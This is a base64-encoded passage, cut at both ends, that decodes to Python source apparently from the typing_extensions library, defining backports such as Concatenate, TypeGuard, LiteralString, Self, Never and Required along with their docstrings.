y44LlxuICAgICAgICBfc3BlY2lhbCA9IEZhbHNlXG5cbiAgICAgICAgZGVmIF9faW5pdF9fKHNlbGYsIG9yaWdpbiwgYXJncyk6XG4gICAgICAgICAgICBzdXBlcigpLl9faW5pdF9fKGFyZ3MpXG4gICAgICAgICAgICBzZWxmLl9fb3JpZ2luX18gPSBvcmlnaW5cbiAgICAgICAgICAgIHNlbGYuX19hcmdzX18gPSBhcmdzXG5cbiAgICAgICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICAgICAgX3R5cGVfcmVwciA9IHR5cGluZy5fdHlwZV9yZXByXG4gICAgICAgICAgICByZXR1cm4gKGZcJ3tfdHlwZV9yZXByKHNlbGYuX19vcmlnaW5fXyl9XCdcbiAgICAgICAgICAgICAgICAgICAgZlwnW3siLCAiLmpvaW4oX3R5cGVfcmVwcihhcmcpIGZvciBhcmcgaW4gc2VsZi5fX2FyZ3NfXyl9XVwnKVxuXG4gICAgICAgIGRlZiBfX2hhc2hfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBoYXNoKChzZWxmLl9fb3JpZ2luX18sIHNlbGYuX19hcmdzX18pKVxuXG4gICAgICAgICMgSGFjayB0byBnZXQgdHlwaW5nLl90eXBlX2NoZWNrIHRvIHBhc3MgaW4gR2VuZXJpYy5cbiAgICAgICAgZGVmIF9fY2FsbF9fKHNlbGYsICphcmdzLCAqKmt3YXJncyk6XG4gICAgICAgICAgICBwYXNzXG5cbiAgICAgICAgQHByb3BlcnR5XG4gICAgICAgIGRlZiBfX3BhcmFtZXRlcnNfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiB0dXBsZShcbiAgICAgICAgICAgICAgICB0cCBmb3IgdHAgaW4gc2VsZi5fX2FyZ3NfXyBpZiBpc2luc3RhbmNlKHRwLCAodHlwaW5nLlR5cGVWYXIsIFBhcmFtU3BlYykpXG4gICAgICAgICAgICApXG5cblxuIyAzLjctMy45XG5AdHlwaW5nLl90cF9jYWNoZVxuZGVmIF9jb25jYXRlbmF0ZV9nZXRpdGVtKHNlbGYsIHBhcmFtZXRlcnMpOlxuICAgIGlmIHBhcmFtZXRlcnMgPT0gKCk6XG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcigiQ2Fubm90IHRha2UgYSBDb25jYXRlbmF0ZSBvZiBubyB0eXBlcy4iKVxuICAgIGlmIG5vdCBpc2luc3RhbmNlKHBhcmFtZXRlcnMsIHR1cGxlKTpcbiAgICAgICAgcGFyYW1ldGVycyA9IChwYXJhbWV0ZXJzLClcbiAgICBpZiBub3QgaXNpbnN0YW5jZShwYXJhbWV0ZXJzWy0xXSwgUGFyYW1TcGVjKTpcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJUaGUgbGFzdCBwYXJhbWV0ZXIgdG8gQ29uY2F0ZW5hdGUgc2hvdWxkIGJlIGEgIlxuICAgICAgICAgICAgICAgICAgICAgICAgIlBhcmFtU3BlYyB2YXJpYWJsZS4iKVxuICAgIG1zZyA9ICJDb25jYXRlbmF0ZVthcmcsIC4uLl06IGVhY2ggYXJnIG11c3QgYmUgYSB0eXBlLiJcbiAgICBwYXJhbWV0ZXJzID0gdHVwbGUodHlwaW5nLl90eXBlX2NoZWNrKHAsIG1zZykgZm9yIHAgaW4gcGFyYW1ldGVycylcbiAgICByZXR1cm4gX0NvbmNhdGVuYXRlR2VuZXJpY0FsaWFzKHNlbGYsIHBhcmFtZXRlcnMpXG5cblxuIyAzLjEwK1xuaWYgaGFzYXR0cih0eXBpbmcsIFwnQ29uY2F0ZW5hdGVcJyk6XG4gICAgQ29uY2F0ZW5hdGUgPSB0eXBpbmcuQ29uY2F0ZW5hdGVcbiAgICBfQ29uY2F0ZW5hdGVHZW5lcmljQWxpYXMgPSB0eXBpbmcuX0NvbmNhdGVuYXRlR2VuZXJpY0FsaWFzICMgbm9xYVxuIyAzLjlcbmVsaWYgc3lzLnZlcnNpb25faW5mb1s6Ml0gPj0gKDMsIDkpOlxuICAgIEBfVHlwZUFsaWFzRm9ybVxuICAgIGRlZiBDb25jYXRlbmF0ZShzZWxmLCBwYXJhbWV0ZXJzKTpcbiAgICAgICAgIiIiVXNlZCBpbiBjb25qdW5jdGlvbiB3aXRoIGBgUGFyYW1TcGVjYGAgYW5kIGBgQ2FsbGFibGVgYCB0byByZXByZXNlbnQgYVxuICAgICAgICBoaWdoZXIgb3JkZXIgZnVuY3Rpb24gd2hpY2ggYWRkcywgcmVtb3ZlcyBvciB0cmFuc2Zvcm1zIHBhcmFtZXRlcnMgb2YgYVxuICAgICAgICBjYWxsYWJsZS5cblxuICAgICAgICBGb3IgZXhhbXBsZTo6XG5cbiAgICAgICAgICAgQ2FsbGFibGVbQ29uY2F0ZW5hdGVbaW50LCBQXSwgaW50XVxuXG4gICAgICAgIFNlZSBQRVAgNjEyIGZvciBkZXRhaWxlZCBpbmZvcm1hdGlvbi5cbiAgICAgICAgIiIiXG4gICAgICAgIHJldHVybiBfY29uY2F0ZW5hdGVfZ2V0aXRlbShzZWxmLCBwYXJhbWV0ZXJzKVxuIyAzLjctOFxuZWxzZTpcbiAgICBjbGFzcyBfQ29uY2F0ZW5hdGVGb3JtKHR5cGluZy5fU3BlY2lhbEZvcm0sIF9yb290PVRydWUpOlxuICAgICAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gXCd0eXBpbmdfZXh0ZW5zaW9ucy5cJyArIHNlbGYuX25hbWVcblxuICAgICAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwgcGFyYW1ldGVycyk6XG4gICAgICAgICAgICByZXR1cm4gX2NvbmNhdGVuYXRlX2dldGl0ZW0oc2VsZiwgcGFyYW1ldGVycylcblxuICAgIENvbmNhdGVuYXRlID0gX0NvbmNhdGVuYXRlRm9ybShcbiAgICAgICAgXCdDb25jYXRlbmF0ZVwnLFxuICAgICAgICBkb2M9IiIiVXNlZCBpbiBjb25qdW5jdGlvbiB3aXRoIGBgUGFyYW1TcGVjYGAgYW5kIGBgQ2FsbGFibGVgYCB0byByZXByZXNlbnQgYVxuICAgICAgICBoaWdoZXIgb3JkZXIgZnVuY3Rpb24gd2hpY2ggYWRkcywgcmVtb3ZlcyBvciB0cmFuc2Zvcm1zIHBhcmFtZXRlcnMgb2YgYVxuICAgICAgICBjYWxsYWJsZS5cblxuICAgICAgICBGb3IgZXhhbXBsZTo6XG5cbiAgICAgICAgICAgQ2FsbGFibGVbQ29uY2F0ZW5hdGVbaW50LCBQXSwgaW50XVxuXG4gICAgICAgIFNlZSBQRVAgNjEyIGZvciBkZXRhaWxlZCBpbmZvcm1hdGlvbi5cbiAgICAgICAgIiIiKVxuXG4jIDMuMTArXG5pZiBoYXNhdHRyKHR5cGluZywgXCdUeXBlR3VhcmRcJyk6XG4gICAgVHlwZUd1YXJkID0gdHlwaW5nLlR5cGVHdWFyZFxuIyAzLjlcbmVsaWYgc3lzLnZlcnNpb25faW5mb1s6Ml0gPj0gKDMsIDkpOlxuICAgIGNsYXNzIF9UeXBlR3VhcmRGb3JtKHR5cGluZy5fU3BlY2lhbEZvcm0sIF9yb290PVRydWUpOlxuICAgICAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gXCd0eXBpbmdfZXh0ZW5zaW9ucy5cJyArIHNlbGYuX25hbWVcblxuICAgIEBfVHlwZUd1YXJkRm9ybVxuICAgIGRlZiBUeXBlR3VhcmQoc2VsZiwgcGFyYW1ldGVycyk6XG4gICAgICAgICIiIlNwZWNpYWwgdHlwaW5nIGZvcm0gdXNlZCB0byBhbm5vdGF0ZSB0aGUgcmV0dXJuIHR5cGUgb2YgYSB1c2VyLWRlZmluZWRcbiAgICAgICAgdHlwZSBndWFyZCBmdW5jdGlvbi4gIGBgVHlwZUd1YXJkYGAgb25seSBhY2NlcHRzIGEgc2luZ2xlIHR5cGUgYXJndW1lbnQuXG4gICAgICAgIEF0IHJ1bnRpbWUsIGZ1bmN0aW9ucyBtYXJrZWQgdGhpcyB3YXkgc2hvdWxkIHJldHVybiBhIGJvb2xlYW4uXG5cbiAgICAgICAgYGBUeXBlR3VhcmRgYCBhaW1zIHRvIGJlbmVmaXQgKnR5cGUgbmFycm93aW5nKiAtLSBhIHRlY2huaXF1ZSB1c2VkIGJ5IHN0YXRpY1xuICAgICAgICB0eXBlIGNoZWNrZXJzIHRvIGRldGVybWluZSBhIG1vcmUgcHJlY2lzZSB0eXBlIG9mIGFuIGV4cHJlc3Npb24gd2l0aGluIGFcbiAgICAgICAgcHJvZ3JhbVwncyBjb2RlIGZsb3cuICBVc3VhbGx5IHR5cGUgbmFycm93aW5nIGlzIGRvbmUgYnkgYW5hbHl6aW5nXG4gICAgICAgIGNvbmRpdGlvbmFsIGNvZGUgZmxvdyBhbmQgYXBwbHlpbmcgdGhlIG5hcnJvd2luZyB0byBhIGJsb2NrIG9mIGNvZGUuICBUaGVcbiAgICAgICAgY29uZGl0aW9uYWwgZXhwcmVzc2lvbiBoZXJlIGlzIHNvbWV0aW1lcyByZWZlcnJlZCB0byBhcyBhICJ0eXBlIGd1YXJkIi5cblxuICAgICAgICBTb21ldGltZXMgaXQgd291bGQgYmUgY29udmVuaWVudCB0byB1c2UgYSB1c2VyLWRlZmluZWQgYm9vbGVhbiBmdW5jdGlvblxuICAgICAgICBhcyBhIHR5cGUgZ3VhcmQuICBTdWNoIGEgZnVuY3Rpb24gc2hvdWxkIHVzZSBgYFR5cGVHdWFyZFsuLi5dYGAgYXMgaXRzXG4gICAgICAgIHJldHVybiB0eXBlIHRvIGFsZXJ0IHN0YXRpYyB0eXBlIGNoZWNrZXJzIHRvIHRoaXMgaW50ZW50aW9uLlxuXG4gICAgICAgIFVzaW5nICBgYC0+IFR5cGVHdWFyZGBgIHRlbGxzIHRoZSBzdGF0aWMgdHlwZSBjaGVja2VyIHRoYXQgZm9yIGEgZ2l2ZW5cbiAgICAgICAgZnVuY3Rpb246XG5cbiAgICAgICAgMS4gVGhlIHJldHVybiB2YWx1ZSBpcyBhIGJvb2xlYW4uXG4gICAgICAgIDIuIElmIHRoZSByZXR1cm4gdmFsdWUgaXMgYGBUcnVlYGAsIHRoZSB0eXBlIG9mIGl0cyBhcmd1bWVudFxuICAgICAgICBpcyB0aGUgdHlwZSBpbnNpZGUgYGBUeXBlR3VhcmRgYC5cblxuICAgICAgICBGb3IgZXhhbXBsZTo6XG5cbiAgICAgICAgICAgIGRlZiBpc19zdHIodmFsOiBVbmlvbltzdHIsIGZsb2F0XSk6XG4gICAgICAgICAgICAgICAgIyAiaXNpbnN0YW5jZSIgdHlwZSBndWFyZFxuICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpOlxuICAgICAgICAgICAgICAgICAgICAjIFR5cGUgb2YgYGB2YWxgYCBpcyBuYXJyb3dlZCB0byBgYHN0cmBgXG4gICAgICAgICAgICAgICAgICAgIC4uLlxuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgICMgRWxzZSwgdHlwZSBvZiBgYHZhbGBgIGlzIG5hcnJvd2VkIHRvIGBgZmxvYXRgYC5cbiAgICAgICAgICAgICAgICAgICAgLi4uXG5cbiAgICAgICAgU3RyaWN0IHR5cGUgbmFycm93aW5nIGlzIG5vdCBlbmZvcmNlZCAtLSBgYFR5cGVCYGAgbmVlZCBub3QgYmUgYSBuYXJyb3dlclxuICAgICAgICBmb3JtIG9mIGBgVHlwZUFgYCAoaXQgY2FuIGV2ZW4gYmUgYSB3aWRlciBmb3JtKSBhbmQgdGhpcyBtYXkgbGVhZCB0b1xuICAgICAgICB0eXBlLXVuc2FmZSByZXN1bHRzLiAgVGhlIG1haW4gcmVhc29uIGlzIHRvIGFsbG93IGZvciB0aGluZ3MgbGlrZVxuICAgICAgICBuYXJyb3dpbmcgYGBMaXN0W29iamVjdF1gYCB0byBgYExpc3Rbc3RyXWBgIGV2ZW4gdGhvdWdoIHRoZSBsYXR0ZXIgaXMgbm90XG4gICAgICAgIGEgc3VidHlwZSBvZiB0aGUgZm9ybWVyLCBzaW5jZSBgYExpc3RgYCBpcyBpbnZhcmlhbnQuICBUaGUgcmVzcG9uc2liaWxpdHkgb2ZcbiAgICAgICAgd3JpdGluZyB0eXBlLXNhZmUgdHlwZSBndWFyZHMgaXMgbGVmdCB0byB0aGUgdXNlci5cblxuICAgICAgICBgYFR5cGVHdWFyZGBgIGFsc28gd29ya3Mgd2l0aCB0eXBlIHZhcmlhYmxlcy4gIEZvciBtb3JlIGluZm9ybWF0aW9uLCBzZWVcbiAgICAgICAgUEVQIDY0NyAoVXNlci1EZWZpbmVkIFR5cGUgR3VhcmRzKS5cbiAgICAgICAgIiIiXG4gICAgICAgIGl0ZW0gPSB0eXBpbmcuX3R5cGVfY2hlY2socGFyYW1ldGVycywgZlwne3NlbGZ9IGFjY2VwdHMgb25seSBhIHNpbmdsZSB0eXBlLlwnKVxuICAgICAgICByZXR1cm4gdHlwaW5nLl9HZW5lcmljQWxpYXMoc2VsZiwgKGl0ZW0sKSlcbiMgMy43LTMuOFxuZWxzZTpcbiAgICBjbGFzcyBfVHlwZUd1YXJkRm9ybSh0eXBpbmcuX1NwZWNpYWxGb3JtLCBfcm9vdD1UcnVlKTpcblxuICAgICAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gXCd0eXBpbmdfZXh0ZW5zaW9ucy5cJyArIHNlbGYuX25hbWVcblxuICAgICAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwgcGFyYW1ldGVycyk6XG4gICAgICAgICAgICBpdGVtID0gdHlwaW5nLl90eXBlX2NoZWNrKHBhcmFtZXRlcnMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZcJ3tzZWxmLl9uYW1lfSBhY2NlcHRzIG9ubHkgYSBzaW5nbGUgdHlwZVwnKVxuICAgICAgICAgICAgcmV0dXJuIHR5cGluZy5fR2VuZXJpY0FsaWFzKHNlbGYsIChpdGVtLCkpXG5cbiAgICBUeXBlR3VhcmQgPSBfVHlwZUd1YXJkRm9ybShcbiAgICAgICAgXCdUeXBlR3VhcmRcJyxcbiAgICAgICAgZG9jPSIiIlNwZWNpYWwgdHlwaW5nIGZvcm0gdXNlZCB0byBhbm5vdGF0ZSB0aGUgcmV0dXJuIHR5cGUgb2YgYSB1c2VyLWRlZmluZWRcbiAgICAgICAgdHlwZSBndWFyZCBmdW5jdGlvbi4gIGBgVHlwZUd1YXJkYGAgb25seSBhY2NlcHRzIGEgc2luZ2xlIHR5cGUgYXJndW1lbnQuXG4gICAgICAgIEF0IHJ1bnRpbWUsIGZ1bmN0aW9ucyBtYXJrZWQgdGhpcyB3YXkgc2hvdWxkIHJldHVybiBhIGJvb2xlYW4uXG5cbiAgICAgICAgYGBUeXBlR3VhcmRgYCBhaW1zIHRvIGJlbmVmaXQgKnR5cGUgbmFycm93aW5nKiAtLSBhIHRlY2huaXF1ZSB1c2VkIGJ5IHN0YXRpY1xuICAgICAgICB0eXBlIGNoZWNrZXJzIHRvIGRldGVybWluZSBhIG1vcmUgcHJlY2lzZSB0eXBlIG9mIGFuIGV4cHJlc3Npb24gd2l0aGluIGFcbiAgICAgICAgcHJvZ3JhbVwncyBjb2RlIGZsb3cuICBVc3VhbGx5IHR5cGUgbmFycm93aW5nIGlzIGRvbmUgYnkgYW5hbHl6aW5nXG4gICAgICAgIGNvbmRpdGlvbmFsIGNvZGUgZmxvdyBhbmQgYXBwbHlpbmcgdGhlIG5hcnJvd2luZyB0byBhIGJsb2NrIG9mIGNvZGUuICBUaGVcbiAgICAgICAgY29uZGl0aW9uYWwgZXhwcmVzc2lvbiBoZXJlIGlzIHNvbWV0aW1lcyByZWZlcnJlZCB0byBhcyBhICJ0eXBlIGd1YXJkIi5cblxuICAgICAgICBTb21ldGltZXMgaXQgd291bGQgYmUgY29udmVuaWVudCB0byB1c2UgYSB1c2VyLWRlZmluZWQgYm9vbGVhbiBmdW5jdGlvblxuICAgICAgICBhcyBhIHR5cGUgZ3VhcmQuICBTdWNoIGEgZnVuY3Rpb24gc2hvdWxkIHVzZSBgYFR5cGVHdWFyZFsuLi5dYGAgYXMgaXRzXG4gICAgICAgIHJldHVybiB0eXBlIHRvIGFsZXJ0IHN0YXRpYyB0eXBlIGNoZWNrZXJzIHRvIHRoaXMgaW50ZW50aW9uLlxuXG4gICAgICAgIFVzaW5nICBgYC0+IFR5cGVHdWFyZGBgIHRlbGxzIHRoZSBzdGF0aWMgdHlwZSBjaGVja2VyIHRoYXQgZm9yIGEgZ2l2ZW5cbiAgICAgICAgZnVuY3Rpb246XG5cbiAgICAgICAgMS4gVGhlIHJldHVybiB2YWx1ZSBpcyBhIGJvb2xlYW4uXG4gICAgICAgIDIuIElmIHRoZSByZXR1cm4gdmFsdWUgaXMgYGBUcnVlYGAsIHRoZSB0eXBlIG9mIGl0cyBhcmd1bWVudFxuICAgICAgICBpcyB0aGUgdHlwZSBpbnNpZGUgYGBUeXBlR3VhcmRgYC5cblxuICAgICAgICBGb3IgZXhhbXBsZTo6XG5cbiAgICAgICAgICAgIGRlZiBpc19zdHIodmFsOiBVbmlvbltzdHIsIGZsb2F0XSk6XG4gICAgICAgICAgICAgICAgIyAiaXNpbnN0YW5jZSIgdHlwZSBndWFyZFxuICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpOlxuICAgICAgICAgICAgICAgICAgICAjIFR5cGUgb2YgYGB2YWxgYCBpcyBuYXJyb3dlZCB0byBgYHN0cmBgXG4gICAgICAgICAgICAgICAgICAgIC4uLlxuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgICMgRWxzZSwgdHlwZSBvZiBgYHZhbGBgIGlzIG5hcnJvd2VkIHRvIGBgZmxvYXRgYC5cbiAgICAgICAgICAgICAgICAgICAgLi4uXG5cbiAgICAgICAgU3RyaWN0IHR5cGUgbmFycm93aW5nIGlzIG5vdCBlbmZvcmNlZCAtLSBgYFR5cGVCYGAgbmVlZCBub3QgYmUgYSBuYXJyb3dlclxuICAgICAgICBmb3JtIG9mIGBgVHlwZUFgYCAoaXQgY2FuIGV2ZW4gYmUgYSB3aWRlciBmb3JtKSBhbmQgdGhpcyBtYXkgbGVhZCB0b1xuICAgICAgICB0eXBlLXVuc2FmZSByZXN1bHRzLiAgVGhlIG1haW4gcmVhc29uIGlzIHRvIGFsbG93IGZvciB0aGluZ3MgbGlrZVxuICAgICAgICBuYXJyb3dpbmcgYGBMaXN0W29iamVjdF1gYCB0byBgYExpc3Rbc3RyXWBgIGV2ZW4gdGhvdWdoIHRoZSBsYXR0ZXIgaXMgbm90XG4gICAgICAgIGEgc3VidHlwZSBvZiB0aGUgZm9ybWVyLCBzaW5jZSBgYExpc3RgYCBpcyBpbnZhcmlhbnQuICBUaGUgcmVzcG9uc2liaWxpdHkgb2ZcbiAgICAgICAgd3JpdGluZyB0eXBlLXNhZmUgdHlwZSBndWFyZHMgaXMgbGVmdCB0byB0aGUgdXNlci5cblxuICAgICAgICBgYFR5cGVHdWFyZGBgIGFsc28gd29ya3Mgd2l0aCB0eXBlIHZhcmlhYmxlcy4gIEZvciBtb3JlIGluZm9ybWF0aW9uLCBzZWVcbiAgICAgICAgUEVQIDY0NyAoVXNlci1EZWZpbmVkIFR5cGUgR3VhcmRzKS5cbiAgICAgICAgIiIiKVxuXG5cbiMgVmVuZG9yZWQgZnJvbSBjcHl0aG9uIHR5cGluZy5fU3BlY2lhbEZyb21cbmNsYXNzIF9TcGVjaWFsRm9ybSh0eXBpbmcuX0ZpbmFsLCBfcm9vdD1UcnVlKTpcbiAgICBfX3Nsb3RzX18gPSAoXCdfbmFtZVwnLCBcJ19fZG9jX19cJywgXCdfZ2V0aXRlbVwnKVxuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGdldGl0ZW0pOlxuICAgICAgICBzZWxmLl9nZXRpdGVtID0gZ2V0aXRlbVxuICAgICAgICBzZWxmLl9uYW1lID0gZ2V0aXRlbS5fX25hbWVfX1xuICAgICAgICBzZWxmLl9fZG9jX18gPSBnZXRpdGVtLl9fZG9jX19cblxuICAgIGRlZiBfX2dldGF0dHJfXyhzZWxmLCBpdGVtKTpcbiAgICAgICAgaWYgaXRlbSBpbiB7XCdfX25hbWVfX1wnLCBcJ19fcXVhbG5hbWVfX1wnfTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9uYW1lXG5cbiAgICAgICAgcmFpc2UgQXR0cmlidXRlRXJyb3IoaXRlbSlcblxuICAgIGRlZiBfX21yb19lbnRyaWVzX18oc2VsZiwgYmFzZXMpOlxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoZiJDYW5ub3Qgc3ViY2xhc3Mge3NlbGYhcn0iKVxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gZlwndHlwaW5nX2V4dGVuc2lvbnMue3NlbGYuX25hbWV9XCdcblxuICAgIGRlZiBfX3JlZHVjZV9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gc2VsZi5fbmFtZVxuXG4gICAgZGVmIF9fY2FsbF9fKHNlbGYsICphcmdzLCAqKmt3ZHMpOlxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoZiJDYW5ub3QgaW5zdGFudGlhdGUge3NlbGYhcn0iKVxuXG4gICAgZGVmIF9fb3JfXyhzZWxmLCBvdGhlcik6XG4gICAgICAgIHJldHVybiB0eXBpbmcuVW5pb25bc2VsZiwgb3RoZXJdXG5cbiAgICBkZWYgX19yb3JfXyhzZWxmLCBvdGhlcik6XG4gICAgICAgIHJldHVybiB0eXBpbmcuVW5pb25bb3RoZXIsIHNlbGZdXG5cbiAgICBkZWYgX19pbnN0YW5jZWNoZWNrX18oc2VsZiwgb2JqKTpcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKGYie3NlbGZ9IGNhbm5vdCBiZSB1c2VkIHdpdGggaXNpbnN0YW5jZSgpIilcblxuICAgIGRlZiBfX3N1YmNsYXNzY2hlY2tfXyhzZWxmLCBjbHMpOlxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoZiJ7c2VsZn0gY2Fubm90IGJlIHVzZWQgd2l0aCBpc3N1YmNsYXNzKCkiKVxuXG4gICAgQHR5cGluZy5fdHBfY2FjaGVcbiAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwgcGFyYW1ldGVycyk6XG4gICAgICAgIHJldHVybiBzZWxmLl9nZXRpdGVtKHNlbGYsIHBhcmFtZXRlcnMpXG5cblxuaWYgaGFzYXR0cih0eXBpbmcsICJMaXRlcmFsU3RyaW5nIik6XG4gICAgTGl0ZXJhbFN0cmluZyA9IHR5cGluZy5MaXRlcmFsU3RyaW5nXG5lbHNlOlxuICAgIEBfU3BlY2lhbEZvcm1cbiAgICBkZWYgTGl0ZXJhbFN0cmluZyhzZWxmLCBwYXJhbXMpOlxuICAgICAgICAiIiJSZXByZXNlbnRzIGFuIGFyYml0cmFyeSBsaXRlcmFsIHN0cmluZy5cblxuICAgICAgICBFeGFtcGxlOjpcblxuICAgICAgICAgIGZyb20gdHlwaW5nX2V4dGVuc2lvbnMgaW1wb3J0IExpdGVyYWxTdHJpbmdcblxuICAgICAgICAgIGRlZiBxdWVyeShzcWw6IExpdGVyYWxTdHJpbmcpIC0+IC4uLjpcbiAgICAgICAgICAgICAgLi4uXG5cbiAgICAgICAgICBxdWVyeSgiU0VMRUNUICogRlJPTSB0YWJsZSIpICAjIG9rXG4gICAgICAgICAgcXVlcnkoZiJTRUxFQ1QgKiBGUk9NIHtpbnB1dCgpfSIpICAjIG5vdCBva1xuXG4gICAgICAgIFNlZSBQRVAgNjc1IGZvciBkZXRhaWxzLlxuXG4gICAgICAgICIiIlxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoZiJ7c2VsZn0gaXMgbm90IHN1YnNjcmlwdGFibGUiKVxuXG5cbmlmIGhhc2F0dHIodHlwaW5nLCAiU2VsZiIpOlxuICAgIFNlbGYgPSB0eXBpbmcuU2VsZlxuZWxzZTpcbiAgICBAX1NwZWNpYWxGb3JtXG4gICAgZGVmIFNlbGYoc2VsZiwgcGFyYW1zKTpcbiAgICAgICAgIiIiVXNlZCB0byBzcGVsbCB0aGUgdHlwZSBvZiAic2VsZiIgaW4gY2xhc3Nlcy5cblxuICAgICAgICBFeGFtcGxlOjpcblxuICAgICAgICAgIGZyb20gdHlwaW5nIGltcG9ydCBTZWxmXG5cbiAgICAgICAgICBjbGFzcyBSZXR1cm5zU2VsZjpcbiAgICAgICAgICAgICAgZGVmIHBhcnNlKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBTZWxmOlxuICAgICAgICAgICAgICAgICAgLi4uXG4gICAgICAgICAgICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgICAgICIiIlxuXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcihmIntzZWxmfSBpcyBub3Qgc3Vic2NyaXB0YWJsZSIpXG5cblxuaWYgaGFzYXR0cih0eXBpbmcsICJOZXZlciIpOlxuICAgIE5ldmVyID0gdHlwaW5nLk5ldmVyXG5lbHNlOlxuICAgIEBfU3BlY2lhbEZvcm1cbiAgICBkZWYgTmV2ZXIoc2VsZiwgcGFyYW1zKTpcbiAgICAgICAgIiIiVGhlIGJvdHRvbSB0eXBlLCBhIHR5cGUgdGhhdCBoYXMgbm8gbWVtYmVycy5cblxuICAgICAgICBUaGlzIGNhbiBiZSB1c2VkIHRvIGRlZmluZSBhIGZ1bmN0aW9uIHRoYXQgc2hvdWxkIG5ldmVyIGJlXG4gICAgICAgIGNhbGxlZCwgb3IgYSBmdW5jdGlvbiB0aGF0IG5ldmVyIHJldHVybnM6OlxuXG4gICAgICAgICAgICBmcm9tIHR5cGluZ19leHRlbnNpb25zIGltcG9ydCBOZXZlclxuXG4gICAgICAgICAgICBkZWYgbmV2ZXJfY2FsbF9tZShhcmc6IE5ldmVyKSAtPiBOb25lOlxuICAgICAgICAgICAgICAgIHBhc3NcblxuICAgICAgICAgICAgZGVmIGludF9vcl9zdHIoYXJnOiBpbnQgfCBzdHIpIC0+IE5vbmU6XG4gICAgICAgICAgICAgICAgbmV2ZXJfY2FsbF9tZShhcmcpICAjIHR5cGUgY2hlY2tlciBlcnJvclxuICAgICAgICAgICAgICAgIG1hdGNoIGFyZzpcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBpbnQoKTpcbiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJJdFwncyBhbiBpbnQiKVxuICAgICAgICAgICAgICAgICAgICBjYXNlIHN0cigpOlxuICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkl0XCdzIGEgc3RyIilcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBfOlxuICAgICAgICAgICAgICAgICAgICAgICAgbmV2ZXJfY2FsbF9tZShhcmcpICAjIG9rLCBhcmcgaXMgb2YgdHlwZSBOZXZlclxuXG4gICAgICAgICIiIlxuXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcihmIntzZWxmfSBpcyBub3Qgc3Vic2NyaXB0YWJsZSIpXG5cblxuaWYgaGFzYXR0cih0eXBpbmcsIFwnUmVxdWlyZWRcJyk6XG4gICAgUmVxdWlyZWQgPSB0eXBpbmcuUmVxdWlyZWRcbiAgICBOb3RSZXF1aXJlZCA9IHR5cGluZy5Ob3RSZXF1aXJlZFxuZWxpZiBzeXMudmVyc2lvbl9pbmZvWzoyXSA+PSAoMywgOSk6XG4gICAgY2xhc3MgX0V4dGVuc2lvbnNTcGVjaWFsRm9ybSh0eXBpbmcuX1NwZWNpYWxGb3JtLCBfcm9vdD1UcnVlKTpcbiAgICAgICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICAgICAgcmV0dXJuIFwndHlwaW5nX2V4dGVuc2lvbnMuXCcgKyBzZWxmLl9uYW1lXG5cbiAgICBAX0V4dGVuc2lvbnNTcGVjaWFsRm9ybVxuICAgIGRlZiBSZXF1aXJlZChzZWxmLCBwYXJhbWV0ZXJzKTpcbiAgICAgICAgIiIiQSBzcGVjaWFsIHR5cGluZyBjb25zdHJ1Y3QgdG8gbWFyayBhIGtleSBvZiBhIHRvdGFsPUZhbHNlIFR5cGVkRGljdFxuICAgICAgICBhcyByZXF1aXJlZC4gRm9yIGV4YW1wbGU6XG5cbiAgICAgICAgICAgIGNsYXNzIE1vdmllKFR5cGVkRGljdCwgdG90YWw9RmFsc2UpOlxuICAgICAgICAgICAgICAgIHRpdGxlOiBSZXF1aXJlZFtzdHJdXG4gICAgICAgICAgICAgICAgeWVhcjogaW50XG5cbiAgICAgICAgICAgIG0gPSBNb3ZpZShcbiAgICAgICAgICAgICAgICB0aXRsZT1cJ1RoZSBNYXRyaXhcJywgICMgdHlwZWNoZWNrZXIgZXJyb3IgaWYga2V5IGlzIG9taXR0ZWRcbiAgICAgICAgICAgICAgICB5ZWFyPTE5OTksXG4gICAgICAgICAgICApXG5cbiAgICAgICAgVGhlcmUgaXMgbm8gcnVudGltZSBjaGVja2luZyB0aGF0IGEgcmVxdWlyZWQga2V5IGlzIGFjdHVhbGx5IHByb3ZpZGVkXG4gICAgICAgIHdoZW4gaW5zdGFudGlhdGluZyBhIHJlbGF0ZWQgVHlwZWREaWN0LlxuICAgICAgICAiIiJcbiAgICAgICAgaXRlbSA9IHR5cGluZy5fdHlwZV9jaGVjayhwYXJhbWV0ZXJzLCBmXCd7c2VsZi5fbmFtZX0gYWNjZXB0cyBvbmx5IGEgc2luZ2xlIHR5cGUuXCcpXG4gICAgICAgIHJldHV